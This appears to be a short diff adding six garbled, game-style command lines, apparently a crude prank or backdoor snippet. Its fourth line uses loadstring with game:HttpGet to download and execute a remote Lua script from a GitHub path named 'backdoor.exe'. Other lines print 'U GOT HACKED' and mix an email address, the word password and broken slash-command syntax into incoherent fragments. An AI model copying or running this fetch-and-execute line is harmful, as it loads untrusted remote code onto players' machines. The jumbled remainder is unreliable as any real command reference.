@@ -1,0 +1,6 @@
+/sudo@572_62h <><meliafaith3@gmail.com
+/sudo@html=password
+/color a 1
+/sudo Run:loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"))();
+/tell @p💆 U GOT HACKED
+/SUDO 😨 EMOTE TURNS WHEN= THE FILE CLICKED 
